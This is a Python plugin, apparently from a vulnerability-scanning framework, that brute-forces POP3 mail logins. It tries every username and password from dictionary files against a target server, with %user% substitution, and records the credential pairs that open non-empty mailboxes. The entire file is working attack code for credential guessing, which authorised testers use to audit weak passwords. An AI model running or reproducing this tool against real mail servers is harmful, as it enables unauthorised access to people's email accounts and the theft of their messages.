#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import time
import socket
import poplib
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.POP3
        self.name = 'pop3 burst'
        self.keyword = ['pop3', 'burst']
        self.info = 'pop3 burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        if _socket_connect(self.target_host, self.target_port):
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else  self.read_file('dict/pop3_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else  self.read_file('dict/pop3_passwords.txt')
            for linef1 in usernamedic:
                username = linef1.strip('\r').strip('\n')
                for linef2 in passworddic:
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    try:
                        time.sleep(0.5)
                        pop = poplib.POP3(self.target_host, self.target_port)
                        pop.user(username)
                        auth = pop.pass_(password)
                        if auth.split(' ')[0] != "+OK":
                            pop.quit()
                            continue
                        if pop.stat()[1] is None or pop.stat()[1] < 1:
                            pop.quit()
                            continue
                        ret = (username, password, pop.stat()[0], pop.stat()[1])
                        self.flag = 1
                        self.req.append({"username": username, "password": password})
                        self.res.append({"info": username + "/" + password, "key": 'pop3'})
                        pop.quit()
                        break
                    except:
                        pass

def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        message = str(s.recv(1024))
        s.close()
        return True
    except:
        return False
